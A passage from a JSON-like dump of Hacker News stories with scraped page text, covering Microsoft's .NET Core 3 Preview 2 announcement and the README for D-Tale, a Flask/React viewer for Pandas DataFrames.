the coming months. The same teams have been making a final set of changes in .NET Framework 4.8. These same changes have also been added to the .NET Core versions of WPF and Windows Forms. Visual Studio support Desktop development on .NET Core 3 requires Visual Studio 2019. We added the WPF and Windows Forms templates to the New Project Dialog to make it easier starting your new applications without using the command line. The WPF and Windows Forms designer teams are continuing to work on an updated designer for .NET Core, which will be part of a Visual Studio 2019 Update. MSIX Deployment for Desktop apps MSIX is a new Windows app package format. It can be used to deploy .NET Core 3 desktop applications to Windows 10. The Windows Application Packaging Project, available in Visual Studio 2019 preview 2, allows you to create MSIX packages with self-contained .NET Core applications. Note: The .NET Core project file must specify the supported runtimes in the <RuntimeIdentifiers> property: <RuntimeIdentifiers>win-x86;win-x64</RuntimeIdentifiers> Install .NET Core 3.0 Previews on Linux with Snap Snap is the preferred way to install and try .NET Core previews on Linux distributions that support Snap. At present, only X64 builds are supported with Snap. Well look at supporting ARM builds, too. After configuring Snap on your system, run the following command to install the .NET Core SDK 3.0 Preview SDK. sudo snap install dotnet-sdk --beta --classic When .NET Core in installed using the Snap package, the default .NET Core command is dotnet-sdk.dotnet, as opposed to just dotnet. The benefit of the namespaced command is that it will not conflict with a globally installed .NET Core version you may have. This command can be aliased to dotnet with: sudo snap alias dotnet-sdk.dotnet dotnet Some distros require an additional step to enable access to the SSL certificate. See our Linux Setup for details. Platform Support .NET Core 3 will be supported on the following operating systems: Windows Client: 7, 8.1, 10 (1607+) Windows Server: 2012 R2 SP1+ macOS: 10.12+ RHEL: 6+ Fedora: 26+ Ubuntu: 16.04+ Debian: 9+ SLES: 12+ openSUSE: 42.3+ Alpine: 3.8+ Chip support follows: x64 on Windows, macOS, and Linux x86 on Windows ARM32 on Windows and Linux ARM64 on Linux For Linux, ARM32 is supported on Debian 9+ and Ubuntu 16.04+. For ARM64, it is the same as ARM32 with the addition of Alpine 3.8. These are the same versions of those distros as is supported for X64. We made a conscious decision to make supported platforms as similar as possible between X64, ARM32 and ARM64. Docker images for .NET Core 3.0 are available at microsoft/dotnet on Docker Hub. We are in the process of adopting Microsoft Container Registry (MCR). We expect that the final .NET Core 3.0 images will only be published to MCR. Closing Take a look at the .NET Core 3.0 Preview 1 post if you missed that. It includes a broader description of the overall release including the initial set of features, which are also included and improved on in Preview 2. Thanks to everyone that installed .NET Core 3.0 Preview 1. We appreciate you trying out the new version and for your feedback. Please share any feedback you have about Preview 2. ",
          "C# pattern matching capabilities are starting to remind me of OCaml tutorials in the university. Sweet.",
          "<i>using var options = Parse(args);</i><p>That's going to tidy up a ton of my code, flatter is definitely better."
        ],
        "story_type": ["Normal"],
        "url": "https://blogs.msdn.microsoft.com/dotnet/2019/01/29/announcing-net-core-3-preview-2/",
        "comments.comment_id": [19033128, 19037266],
        "comments.comment_author": ["oaiey", "tonyedgecombe"],
        "comments.comment_descendants": [0, 0],
        "comments.comment_time": [
          "2019-01-30T06:25:13Z",
          "2019-01-30T17:40:02Z"
        ],
        "comments.comment_text": [
          "C# pattern matching capabilities are starting to remind me of OCaml tutorials in the university. Sweet.",
          "<i>using var options = Parse(args);</i><p>That's going to tidy up a ton of my code, flatter is definitely better."
        ],
        "id": "afe689c0-616b-4b4f-86a2-530899fc7d37",
        "url_text": "Richard January 29th, 2019 Today, we are announcing .NET Core 3 Preview 2. It includes new features in .NET Core 3.0 and C# 8, in addition to the large number of new features in Preview 1. ASP.NET Core 3.0 Preview 2 is alsoreleased today. C# 8 Preview 2 is part of .NET Core 3 SDK, and was also released last week with Visual Studio 2019 Preview 2. Download and get started with .NET Core 3 Preview 2 right now on Windows, macOS and Linux. In case you missed it, we made some big announcements with Preview 1, including adding support for Windows Forms and WPF with .NET Core, on Windows, and that both UI frameworks will be open source. We also announced that we would support Entity Framework 6 on .NET Core, which will come in a later preview. ASP.NET Core is also adding many features including Razor components. Please provide feedback on the release in the comments below or at dotnet/core #2263. You can see complete details of the release in the .NET Core 3 Preview 2 release notes. .NET Core 3 will be supported in Visual Studio 2019, Visual Studio for Mac and Visual Studio Code. Visual Studio 2019 Preview 2 was released last week and has support for C# 8. The Visual Studio Code C# Extension (in pre-release channel) was also just updated to support C# 8. C# 8 C# 8 is a major release of the language, as Mads describes in Do more with patterns in C# 8.0, Take C# 8.0 for a spin and Building C# 8.0. In this post, Ill cover a few favorites that are new in Preview 2. Using Declarations Are you tired of using statements that require indenting your code? No more! You can now write the following code, which attaches a using declaration to the scope of the current statement block and then disposes the object at the end of it. Switch Expressions Anyone who uses C# probably loves the idea of a switch statement, but not the syntax. C# 8 introduces switch expressions, which enable the following: terser syntax, returns a value since it is an expression, and fully integrated with pattern matching. The switch keyword is infix, meaning the keyword sits between the tested value (here, thats o) and the list of cases, much like expression lambdas. The following examples use the lambda syntax for methods, which integrates well with switch expressions but isnt required. You can see the syntax for switch expressions in the following example: There are two patterns at play in this example. o first matches with the Point type pattern and then with the property pattern inside the {curly braces}. The _ describes the discard pattern, which is the same as default for switch statements. You can go one step further, and rely on tuple deconstruction and parameter position, as you can see in the following example: In this example, you can see you do not need to define a variable or explicit type for each of the cases. Instead, the compiler can match the tuple being testing with the tuples defined for each of the cases. All of these patterns enable you to write declarative code that captures your intent instead of procedural code that implements tests for it. The compiler becomes responsible for implementing that boring procedural code and is guaranteed to always do it correctly. There will still be cases where switch statements will be a better choice than switch expressions and patterns can be used with both syntax styles. Async streams Async streams are another major improvement in C# 8. They have been changing with each preview and require that the compiler and the framework libraries match to work correctly. You need .NET Core 3.0 Preview 2 to use async streams if you want to develop with either Visual Studio 2019 Preview 2 or the latest preview of the C# extension for Visual Studio Code. If you are using .NET Core 3.0 Preview 2 at the commandline, then everything will work as expected. IEEE Floating-point improvements Floating point APIs are in the process of being updated to comply with IEEE 754-2008 revision. The goal of this floating point project is to expose all required operations and ensure that they are behaviorly compliant with the IEEE spec. Parsing and formatting fixes: Correctly parse and round inputs of any length. Correctly parse and format negative zero. Correctly parse Infinity and NaN by performing a case-insensitive check and allowing an optional preceding + where applicable. New Math APIs: BitIncrement/BitDecrement corresponds to the nextUp and nextDown IEEE operations. They return the smallest floating-point number that compares greater or lesser than the input (respectively). For example, Math.BitIncrement(0.0) would return double.Epsilon. MaxMagnitude/MinMagnitude corresponds to the maxNumMag and minNumMag IEEE operations, they return the value that is greater or lesser in magnitude of the two inputs (respectively). For example, Math.MaxMagnitude(2.0, -3.0) would return -3.0. ILogB corresponds to the logB IEEE operation which returns an integral value, it returns the integral base-2 log of the input parameter. This is effectively the same as floor(log2(x)), but done with minimal rounding error. ScaleB corresponds to the scaleB IEEE operation which takes an integral value, it returns effectively x * pow(2, n), but is done with minimal rounding error. Log2 corresponds to the log2 IEEE operation, it returns the base-2 logarithm. It minimizes rounding error. FusedMultiplyAdd corresponds to the fma IEEE operation, it performs a fused multiply add. That is, it does (x * y) + z as a single operation, there-by minimizing the rounding error. An example would be FusedMultiplyAdd(1e308, 2.0, -1e308) which returns 1e308. The regular (1e308 * 2.0) - 1e308 returns double.PositiveInfinity. CopySign corresponds to the copySign IEEE operation, it returns the value of x, but with the sign of y. .NET Platform Dependent Intrinsics Weve added APIs that allow access to certain perf-oriented CPU instructions, such as the SIMD or Bit Manipulation instruction sets. These instructions can help achieve big performance improvements in certain scenarios, such as processing data efficiently in parallel. In addition to exposing the APIs for your programs to use, we have begun using these instructions to accelerate the .NET libraries too. The following CoreCLR PRs demonstrate a few of the intrinsics, either via implementation or use: Implement simple SSE2 hardware instrinsics Implement the SSE hardware intrinsics Arm64 Base HW Intrinsics Use TZCNT and LZCNT for Locate{First|Last}Found{Byte|Char} For more information, take a look at .NET Platform Dependent Intrinsics, which defines an approach for defining this hardware infrastructure, allowing Microsoft, chip vendors or any other company or individual to define hardware/chip APIs that should be exposed to .NET code. Introducing a fast in-box JSON Writer & JSON Document Following the introduction of the JSON reader in preview1, weve added System.Text.Json.Utf8JsonWriter and System.Text.Json.JsonDocument. As described in our System.Text.Json roadmap, we plan to provide a POCO serializer and deserializer next. Utf8JsonWriter The Utf8JsonWriter provides a high-performance, non-cached, forward-only way to write UTF-8 encoded JSON text from common .NET types like String, Int32, and DateTime. Like the reader, the writer is a foundational, low-level type, that can be leveraged to build custom serializers. Writing a JSON payload using the new Utf8JsonWriter is 30-80% faster than using the writer from Json.NET and does not allocate. Here is a sample usage of the Utf8JsonWriter that can be used as a starting point: The Utf8JsonWriter accepts IBufferWriter<byte> as the output location to synchronously write the json data into and you, as the caller, need to provide a concrete implementation. The platform does not currently include an implementation of this interface, but we plan to provide one that is backed by a resizable byte array. That implementation would enable synchronous writes, which could then be copied to any stream (either synchronously or asynchronously). If you are writing JSON over the network and include the System.IO.Pipelines package, you can leverage the Pipe-based implementation of the interface called PipeWriter to skip the need to copy the JSON from an intermediary buffer to the actual output. You can take inspiration from this sample implementation of IBufferWriter<T>. The following is a skeleton array-backed concrete implementation of the interface: JsonDocument In preview2, weve also added System.Text.Json.JsonDocument which was built on top of the Utf8JsonReader. The JsonDocument provides the ability to parse JSON data and build a read-only Document Object Model (DOM) that can be queried to support random access and enumeration. The JSON elements that compose the data can be accessed via the JsonElement type which is exposed by the JsonDocument as a property called RootElement. The JsonElement contains the JSON array and object enumerators along with APIs to convert JSON text to common .NET types. Parsing a typical JSON payload and accessing all its members using the JsonDocument is 2-3x faster than Json.NET with very little allocations for data that is reasonably sized (i.e. < 1 MB). Here is a sample usage of the JsonDocument and JsonElement that can be used as a starting point: GPIO Support for Raspberry Pi We added initial support for GPIO with Preview 1. As part of Preview 2, we have released two NuGet packages that you can use for GPIO programming. System.Device.Gpio Iot.Device.Bindings The GPIO Packages includes APIs for GPIO, SPI, I2C and PWM devices. The IoT bindings package includes device bindings for various chips and sensors, the same ones available at dotnet/iot src/devices. Updated serial port APIs were announced as part of Preview 1. They are not part of these packages but are available as part of the .NET Core platform. Local dotnet tools Local dotnet tools have been improved in Preview 2. Local tools are similar to dotnet global tools but are associated with a particular location on disk. This enables per-project and per-repository tooling. You can read more about them in the .NET Core 3.0 Preview 1 post. In this preview, we have added 2 new commands: dotnet new tool-manifest dotnet tool list To add local tools, you need to add a manifest that will define the tools and versions available. The dotnet new tool-manifest command automates creation of the manifest required by local tools. After this file is created, you can add tools to it via dotnet tool install <packageId>. The command dotnet tool list lists local tools and their corresponding manifest. The command dotnet tool list -g lists global tools. There was a change in .NET Core Local Tools between .NET Core 3.0 Preview 1 and .NET Core 3.0 Preview 2. If you tried out local tools in Preview 1 by running a command like dotnet tool restore or dotnet tool install, you need to delete your local tools cache folder before local tools will work correctly in Preview 2. This folder is located at: On mac, Linux: rm -r $HOME/.dotnet/toolResolverCache On Windows: rmdir /s %USERPROFILE%\\.dotnet\\toolResolverCache If you do not delete this folder, you will receive an error. Assembly Unloadability Assembly unloadability is a new capability of AssemblyLoaderContext. This new feature is largely transparent from an API perspective, exposed with just a few new APIs. It enables a loader context to be unloaded, releasing all memory for instantiated types, static fields and for the assembly itself. An application should be able to load and unload assemblies via this mechanism forever without experiencing a memory leak. We expect this new capability to be used for the following scenarios: Plugin scenarios where dynamic plugin loading and unloading is required. Dynamically compiling, running and then flushing code. Useful for web sites, scripting engines, etc. Loading assemblies for introspection (like ReflectionOnlyLoad), although MetadataLoadContext (released in Preview 1) will be a better choice in many cases. More information: Design doc Using Unloadability doc Assembly unloading requires significant care to ensure that all references to managed objects from outside a loader context are understood and managed. When the loader context is requested to be unloaded, any outside references need to have been unreferenced so that the loader context is self-consistent only to itself. Assembly unloadability was provided in the .NET Framework by Application Domains (AppDomains), which are not supported with .NET Core. AppDomains had both benefits and limitations compared to this new model. We consider this new loader context-based model to be more flexible and higher performance when compared to AppDomains. Windows Native Interop Windows offers a rich native API, in the form of flat C APIs, COM and WinRT. Weve had support for P/Invoke since .NET Core 1.0, and have been adding the ability to CoCreate COM APIs and Activate WinRT APIs as part of the .NET Core 3.0 release. We have had many requests for these capabilities, so we know that they will get a lot of use. Late last year, we announced that we had managed to automate Excel from .NET Core. That was a fun moment. You can now try this same demo yourself with the Excel demo sample. Under the covers, this demo is using COM interop features like NOPIA, object equivalence and custom marshallers. Managed C++ and WinRT interop are coming in a later preview. We prioritized getting COM interop built first. WPF and Windows Forms The WPF and Windows Forms teams opened up their repositories, dotnet/wpf and dotnet/winforms, respectively, on December 4th, the same day .NET Core 3.0 Preview 1 was released. Much of the last month, beyond holidays, has been spent interacting with the community, merging PRs, and responding to issues. In the background, theyve been integrating WPF and Windows Forms into the .NET Core build system, including adopting the Arcade SDK. Arcade is an MSBuild SDK that exposes functionality which is needed to build the .NET Platform. The WPF team will be publishing more of the WPF source code over the coming months. The same teams have been making a final set of changes in .NET Framework 4.8. These same changes have also been added to the .NET Core versions of WPF and Windows Forms. Visual Studio support Desktop development on .NET Core 3 requires Visual Studio 2019. We added the WPF and Windows Forms templates to the New Project Dialog to make it easier starting your new applications without using the command line. The WPF and Windows Forms designer teams are continuing to work on an updated designer for .NET Core, which will be part of a Visual Studio 2019 Update. MSIX Deployment for Desktop apps MSIX is a new Windows app package format. It can be used to deploy .NET Core 3 desktop applications to Windows 10. The Windows Application Packaging Project, available in Visual Studio 2019 preview 2, allows you to create MSIX packages with self-contained .NET Core applications. Note: The .NET Core project file must specify the supported runtimes in the <RuntimeIdentifiers> property: <RuntimeIdentifiers>win-x86;win-x64</RuntimeIdentifiers> Install .NET Core 3.0 Previews on Linux with Snap Snap is the preferred way to install and try .NET Core previews on Linux distributions that support Snap. At present, only X64 builds are supported with Snap. Well look at supporting ARM builds, too. After configuring Snap on your system, run the following command to install the .NET Core SDK 3.0 Preview SDK. sudo snap install dotnet-sdk --beta --classic When .NET Core in installed using the Snap package, the default .NET Core command is dotnet-sdk.dotnet, as opposed to just dotnet. The benefit of the namespaced command is that it will not conflict with a globally installed .NET Core version you may have. This command can be aliased to dotnet with: sudo snap alias dotnet-sdk.dotnet dotnet Some distros require an additional step to enable access to the SSL certificate. See our Linux Setup for details. Platform Support .NET Core 3 will be supported on the following operating systems: Windows Client: 7, 8.1, 10 (1607+) Windows Server: 2012 R2 SP1+ macOS: 10.12+ RHEL: 6+ Fedora: 26+ Ubuntu: 16.04+ Debian: 9+ SLES: 12+ openSUSE: 42.3+ Alpine: 3.8+ Chip support follows: x64 on Windows, macOS, and Linux x86 on Windows ARM32 on Windows and Linux ARM64 on Linux For Linux, ARM32 is supported on Debian 9+ and Ubuntu 16.04+. For ARM64, it is the same as ARM32 with the addition of Alpine 3.8. These are the same versions of those distros as is supported for X64. We made a conscious decision to make supported platforms as similar as possible between X64, ARM32 and ARM64. Docker images for .NET Core 3.0 are available at microsoft/dotnet on Docker Hub. We are in the process of adopting Microsoft Container Registry (MCR). We expect that the final .NET Core 3.0 images will only be published to MCR. Closing Take a look at the .NET Core 3.0 Preview 1 post if you missed that. It includes a broader description of the overall release including the initial set of features, which are also included and improved on in Preview 2. Thanks to everyone that installed .NET Core 3.0 Preview 1. We appreciate you trying out the new version and for your feedback. Please share any feedback you have about Preview 2. ",
        "_version_": 1718527384223744000
      },
      {
        "story_id": [21884472],
        "story_author": ["aschonfe"],
        "story_descendants": [3],
        "story_score": [12],
        "story_time": ["2019-12-26T15:35:59Z"],
        "story_title": "Show HN: Better Visualization for Pandas DataFrames",
        "search": [
          "Show HN: Better Visualization for Pandas DataFrames",
          "https://github.com/man-group/dtale",
          "Live Demo Animated US COVID-19 Deaths By State 3D Scatter Chart Surface Chart Network Analysis What is it? D-Tale is the combination of a Flask back-end and a React front-end to bring you an easy way to view & analyze Pandas data structures. It integrates seamlessly with ipython notebooks & python/ipython terminals. Currently this tool supports such Pandas objects as DataFrame, Series, MultiIndex, DatetimeIndex & RangeIndex. Origins D-Tale was the product of a SAS to Python conversion. What was originally a perl script wrapper on top of SAS's insight function is now a lightweight web client on top of Pandas data structures. In The News 4 Libraries that can perform EDA in one line of python code React Status KDNuggets Man Institute (warning: contains deprecated functionality) Python Bytes FlaskCon 2020 San Diego Python Medium: towards data science Medium: Exploratory Data Analysis Using D-Tale EOD Notes: Using python and dtale to analyze correlations Data Exploration is Now Super Easy w/ D-Tale Practical Business Python Tutorials Pip Install Python YouTube Channel machine_learning_2019 D-Tale The Best Library To Perform Exploratory Data Analysis Using Single Line Of Code Explore and Analyze Pandas Data Structures w/ D-Tale Data Preprocessing simplest method Related Resources Adventures In Flask While Developing D-Tale Adding Range Selection to react-virtualized Building Draggable/Resizable Modals Embedding Flask Apps within Streamlit Contents Where To Get It Getting Started Python Terminal As A Script Jupyter Notebook Jupyterhub w/ Jupyter Server Proxy Jupyterhub w/ Kubernetes Docker Container Google Colab Kaggle Binder R with Reticulate Startup with No Data Command-line Custom Command-line Loaders Embedding Within Your Own Flask App Embedding Within Your Own Django App Embedding Within Streamlit Running D-Tale On Gunicorn w/ Redis Configuration Authentication Predefined Filters Using Swifter UI Dimensions/Ribbon Menu/Main Menu Header Resize Columns Editing Cells Copy Cells Into Clipboard Main Menu Functions XArray Operations, Describe, Outlier Detection, Custom Filter, Dataframe Functions, Merge & Stack, Summarize Data, Duplicates, Missing Analysis, Correlations, Predictive Power Score, Heat Map, Highlight Dtypes, Highlight Missing, Highlight Outliers, Highlight Range, Low Variance Flag, Instances, Code Exports, Export CSV, Load Data & Sample Datasets, Refresh Widths, About, Theme, Reload Data, Unpin/Pin Menu, Language, Shutdown Column Menu Functions Filtering, Moving Columns, Hiding Columns, Delete, Rename, Replacements, Lock, Unlock, Sorting, Formats, Describe (Column Analysis) Charts Network Viewer Hotkeys Menu Functions Depending on Browser Dimensions For Developers Cloning Running Tests Linting Formatting JS Docker Development Adding Language Support Global State/Data Storage Startup Behavior Documentation Dependencies Acknowledgements License Where To get It The source code is currently hosted on GitHub at: https://github.com/man-group/dtale Binary installers for the latest released version are available at the Python package index and on conda using conda-forge. # conda conda install dtale -c conda-forge # if you want to also use \"Export to PNG\" for charts conda install -c plotly python-kaleido # or PyPI pip install dtale Getting Started PyCharm jupyter Python Terminal This comes courtesy of PyCharm Feel free to invoke python or ipython directly and use the commands in the screenshot above and it should work Issues With Windows Firewall If you run into issues with viewing D-Tale in your browser on Windows please try making Python public under \"Allowed Apps\" in your Firewall configuration. Here is a nice article: How to Allow Apps to Communicate Through the Windows Firewall Additional functions available programmatically import dtale import pandas as pd df = pd.DataFrame([dict(a=1,b=2,c=3)]) # Assigning a reference to a running D-Tale process d = dtale.show(df) # Accessing data associated with D-Tale process tmp = d.data.copy() tmp['d'] = 4 # Altering data associated with D-Tale process # FYI: this will clear any front-end settings you have at the time for this process (filter, sorts, formatting) d.data = tmp # Shutting down D-Tale process d.kill() # using Python's `webbrowser` package it will try and open your server's default browser to this process d.open_browser() # There is also some helpful metadata about the process d._data_id # the process's data identifier d._url # the url to access the process d2 = dtale.get_instance(d._data_id) # returns a new reference to the instance running at that data_id dtale.instances() # prints a list of all ids & urls of running D-Tale sessions Duplicate data check To help guard against users loading the same data to D-Tale multiple times and thus eating up precious memory, we have a loose check for duplicate input data. The check runs the following: Are row & column count the same as a previously loaded piece of data? Are the names and order of columns the same as a previously loaded piece of data? If both these conditions are true then you will be presented with an error and a link to the previously loaded data. Here is an example of how the interaction looks: As A Script D-Tale can be run as script by adding subprocess=False to your dtale.show command. Here is an example script: import dtale import pandas as pd if __name__ == '__main__': dtale.show(pd.DataFrame([1,2,3,4,5]), subprocess=False) Jupyter Notebook Within any jupyter (ipython) notebook executing a cell like this will display a small instance of D-Tale in the output cell. Here are some examples: dtale.show assignment instance If you are running ipython<=5.0 then you also have the ability to adjust the size of your output cell for the most recent instance displayed: One thing of note is that a lot of the modal popups you see in the standard browser version will now open separate browser windows for spacial convienence: Column Menus Correlations Describe Column Analysis Instances JupyterHub w/ Jupyter Server Proxy JupyterHub has an extension that allows to proxy port for user, JupyterHub Server Proxy To me it seems like this extension might be the best solution to getting D-Tale running within kubernetes. Here's how to use it: import pandas as pd import dtale import dtale.app as dtale_app dtale_app.JUPYTER_SERVER_PROXY = True dtale.show(pd.DataFrame([1,2,3])) Notice the command dtale_app.JUPYTER_SERVER_PROXY = True this will make sure that any D-Tale instance will be served with the jupyter server proxy application root prefix: /user/{jupyter username}/proxy/{dtale instance port}/ One thing to note is that if you try to look at the _main_url of your D-Tale instance in your notebook it will not include the hostname or port: import pandas as pd import dtale import dtale.app as dtale_app dtale_app.JUPYTER_SERVER_PROXY = True d = dtale.show(pd.DataFrame([1,2,3])) d._main_url # /user/johndoe/proxy/40000/dtale/main/1 This is because it's very hard to promgramatically figure out the host/port that your notebook is running on. So if you want to look at _main_url please be sure to preface it with: http[s]://[jupyterhub host]:[jupyterhub port] If for some reason jupyterhub changes their API so that the application root changes you can also override D-Tale's application root by using the app_root parameter to the show() function: import pandas as pd import dtale import dtale.app as dtale_app dtale.show(pd.DataFrame([1,2,3]), app_root='/user/johndoe/proxy/40000/`) Using this parameter will only apply the application root to that specific instance so you would have to include it on every call to show(). JupyterHub w/ Kubernetes Please read this post Docker Container If you have D-Tale installed within your docker container please add the following parameters to your docker run command. On a Mac: docker run -h `hostname` -p 40000:40000 -h this will allow the hostname (and not the PID of the docker container) to be available when building D-Tale URLs -p access to port 40000 which is the default port for running D-Tale On Windows: docker run -p 40000:40000 -p access to port 40000 which is the default port for running D-Tale D-Tale URL will be http://127.0.0.1:40000/ Everything Else: docker run -h `hostname` --network host -h this will allow the hostname (and not the PID of the docker container) to be available when building D-Tale URLs --network host this will allow access to as many ports as needed for running D-Tale processes Google Colab This is a hosted notebook site and thanks to Colab's internal function google.colab.output.eval_js & the JS function google.colab.kernel.proexyPort users can run D-Tale within their notebooks. DISCLAIMER: It is import that you set USE_COLAB to true when using D-Tale within this service. Here is an example: import pandas as pd import dtale import dtale.app as dtale_app dtale_app.USE_COLAB = True dtale.show(pd.DataFrame([1,2,3])) If this does not work for you try using USE_NGROK which is described in the next section. Kaggle This is yet another hosted notebook site and thanks to the work of flask_ngrok users can run D-Tale within their notebooks. DISCLAIMER: It is import that you set USE_NGROK to true when using D-Tale within this service. Here is an example: import pandas as pd import dtale import dtale.app as dtale_app dtale_app.USE_NGROK = True dtale.show(pd.DataFrame([1,2,3])) Here are some video tutorials of each: Service Tutorial Addtl Notes Google Colab Kaggle make sure you switch the \"Internet\" toggle to \"On\" under settings of your notebook so you can install the egg from pip It is important to note that using NGROK will limit you to 20 connections per mintue so if you see this error: Wait a little while and it should allow you to do work again. I am actively working on finding a more sustainable solution similar to what I did for google colab. Binder I have built a repo which shows an example of how to run D-Tale within Binder here. The important take-aways are: you must have jupyter-server-proxy installed look at the environment.yml file to see how to add it to your environment look at the postBuild file for how to activate it on startup R with Reticulate I was able to get D-Tale running in R using reticulate. Here is an example: library('reticulate') dtale <- import('dtale') df <- read.csv('https://vincentarelbundock.github.io/Rdatasets/csv/boot/acme.csv') dtale$show(df, subprocess=FALSE, open_browser=TRUE) Now the problem with doing this is that D-Tale is not running as a subprocess so it will block your R console and you'll lose out the following functions: manipulating the state of your data from your R console adding more data to D-Tale open_browser=TRUE isn't required and won't work if you don't have a default browser installed on your machine. If you don't use that parameter simply copy & paste the URL that gets printed to your console in the browser of your choice. I'm going to do some more digging on why R doesn't seem to like using python subprocesses (not sure if it something with how reticulate manages the state of python) and post any findings to this thread. Here's some helpful links for getting setup: reticulate installing python packages Startup with No Data It is now possible to run D-Tale with no data loaded up front. So simply call dtale.show() and this will start the application for you and when you go to view it you will be presented with a screen where you can upload either a CSV or TSV file for data. Once you've loaded a file it will take you directly to the standard data grid comprised of the data from the file you loaded. This might make it easier to use this as an on demand application within a container management system like kubernetes. You start and stop these on demand and you'll be presented with a new instance to load any CSV or TSV file to! Command-line Base CLI options (run dtale --help to see all options available) Prop Description --host the name of the host you would like to use (most likely not needed since socket.gethostname() should figure this out) --port the port you would like to assign to your D-Tale instance --name an optional name you can assign to your D-Tale instance (this will be displayed in the <title> & Instances popup) --debug turn on Flask's \"debug\" mode for your D-Tale instance --no-reaper flag to turn off auto-reaping subprocess (kill D-Tale instances after an hour of inactivity), good for long-running displays --open-browser flag to automatically open up your server's default browser to your D-Tale instance --force flag to force D-Tale to try an kill any pre-existing process at the port you've specified so it can use it Loading data from arctic(high performance datastore for pandas dataframes) (this requires either installing arctic or dtale[arctic]) dtale --arctic-host mongodb://localhost:27027 --arctic-library jdoe.my_lib --arctic-node my_node --arctic-start 20130101 --arctic-end 20161231 Loading data from CSV dtale --csv-path /home/jdoe/my_csv.csv --csv-parse_dates date Loading data from EXCEL dtale --excel-path /home/jdoe/my_csv.xlsx --excel-parse_dates date dtale --excel-path /home/jdoe/my_csv.xls --excel-parse_dates date Loading data from JSON dtale --json-path /home/jdoe/my_json.json --json-parse_dates date or dtale --json-path http://json-endpoint --json-parse_dates date Loading data from R Datasets dtale --r-path /home/jdoe/my_dataset.rda Loading data from SQLite DB Files dtale --sqlite-path /home/jdoe/test.sqlite3 --sqlite-table test_table Custom Command-line Loaders Loading data from a Custom loader Using the DTALE_CLI_LOADERS environment variable, specify a path to a location containing some python modules Any python module containing the global variables LOADER_KEY & LOADER_PROPS will be picked up as a custom loader LOADER_KEY: the key that will be associated with your loader. By default you are given arctic & csv (if you use one of these are your key it will override these) LOADER_PROPS: the individual props available to be specified. For example, with arctic we have host, library, node, start & end. If you leave this property as an empty list your loader will be treated as a flag. For example, instead of using all the arctic properties we would simply specify --arctic (this wouldn't work well in arctic's case since it depends on all those properties) You will also need to specify a function with the following signature def find_loader(kwargs) which returns a function that returns a dataframe or None Here is an example of a custom loader: from dtale.cli.clickutils import get_loader_options ''' IMPORTANT!!! This global variable is required for building any customized CLI loader. When find loaders on startup it will search for any modules containing the global variable LOADER_KEY. ''' LOADER_KEY = 'testdata' LOADER_PROPS = ['rows', 'columns'] def test_data(rows, columns): import pandas as pd import numpy as np import random from past.utils import old_div from pandas.tseries.offsets import Day from dtale.utils import dict_merge import string now = pd.Timestamp(pd.Timestamp('now').date()) dates = pd.date_range(now - Day(364), now) num_of_securities = max(old_div(rows, len(dates)), 1) # always have at least one security securities = [ dict(security_id=100000 + sec_id, int_val=random.randint(1, 100000000000), str_val=random.choice(string.ascii_letters) * 5) for sec_id in range(num_of_securities) ] data = pd.concat([ pd.DataFrame([dict_merge(dict(date=date), sd) for sd in securities]) for date in dates ], ignore_index=True)[['date', 'security_id', 'int_val', 'str_val']] col_names = ['Col{}'.format(c) for c in range(columns)] return pd.concat([data, pd.DataFrame(np.random.randn(len(data), columns), columns=col_names)], axis=1) # IMPORTANT!!! This function is required for building any customized CLI loader. def find_loader(kwargs): test_data_opts = get_loader_options(LOADER_KEY, LOADER_PROPS, kwargs) if len([f for f in test_data_opts.values() if f]): def _testdata_loader(): return test_data(int(test_data_opts.get('rows', 1000500)), int(test_data_opts.get('columns', 96))) return _testdata_loader return None In this example we simplying building a dataframe with some dummy data based on dimensions specified on the command-line: --testdata-rows --testdata-columns Here's how you would use this loader: DTALE_CLI_LOADERS=./path_to_loaders bash -c 'dtale --testdata-rows 10 --testdata-columns 5' Authentication You can choose to use optional authentication by adding the following to your D-Tale .ini file (directions here): [auth] active = True username = johndoe password = 1337h4xOr Or you can call the following: import dtale.global_state as global_state global_state.set_auth_settings({'active': True, 'username': 'johndoe', 'password': '1337h4x0r'}) If you have done this before initially starting D-Tale it will have authentication applied. If you are adding this after starting D-Tale you will have to kill your service and start it over. When opening your D-Tale session you will be presented with a screen like this: From there you can enter the credentials you either set in your .ini file or in your call to dtale.global_state.set_auth_settings and you will be brought to the main grid as normal. You will now have an additional option in your main menu to logout: Instance Settings Users can set front-end properties on their instances programmatically in the dtale.show function or by calling the update_settings function on their instance. For example: import dtale import pandas as pd df = pd.DataFrame(dict( a=[1,2,3,4,5], b=[6,7,8,9,10], c=['a','b','c','d','e'] )) dtale.show( df, locked=['c'], column_formats={'a': {'fmt': '0.0000'}}, nan_display='...', background_mode='heatmap-col', sort=[('a','DESC')], vertical_headers=True, ) or import dtale import pandas as pd df = pd.DataFrame(dict( a=[1,2,3,4,5], b=[6,7,8,9,10], c=['a','b','c','d','e'] )) d = dtale.show( df ) d.update_settings( locked=['c'], column_formats={'a': {'fmt': '0.0000'}}, nan_display='...', background_mode='heatmap-col', sort=[('a','DESC')], vertical_headers=True, ) d Here's a short description of each instance setting available: show_columns A list of column names you would like displayed in your grid. Anything else will be hidden. hide_columns A list of column names you would like initially hidden from the grid display. column_formats A dictionary of column name keys and their front-end display configuration. Here are examples of the different format configurations: Numeric: {'fmt': '0.00000'} String: {'fmt': {'truncate': 10}} truncate string values to no more than 10 characters followed by an ellipses {'fmt': {'link': True}} if your strings are URLs convert them to clickable links {'fmt': {'html': True}} if your strings are HTML fragments render them as HTML Date: {'fmt': 'MMMM Do YYYY, h:mm:ss a'} uses Moment.js formatting nan_display Converts any nan values in your dataframe to this when it is sent to the browser (doesn't actually change the state of your dataframe) sort List of tuples which sort your dataframe (EX: [('a', 'ASC'), ('b', 'DESC')]) locked List of column names which will be locked to the right side of your grid while you scroll to the left. background_mode A string denoting one of the many background displays available in D-Tale. Options are: heatmap-all: turn on heatmap for all numeric columns where the colors are determined by the range of values over all numeric columns combined heatmap-col: turn on heatmap for all numeric columns where the colors are determined by the range of values in the column heatmap-col-[column name]: turn on heatmap highlighting for a specific column dtypes: highlight columns based on it's data type missing: highlight any missing values (np.nan, empty strings, strings of all spaces) outliers: highlight any outliers range: highlight values for any matchers entered in the \"range_highlights\" option lowVariance: highlight values with a low variance range_highlights Dictionary of column name keys and range configurations which if the value for that column exists then it will be shaded that color. Here is an example input: 'a': { 'active': True, 'equals': {'active': True, 'value': 3, 'color': {'r': 255, 'g': 245, 'b': 157, 'a': 1}}, # light yellow 'greaterThan': {'active': True, 'value': 3, 'color': {'r': 80, 'g': 227, 'b': 194, 'a': 1}}, # mint green 'lessThan': 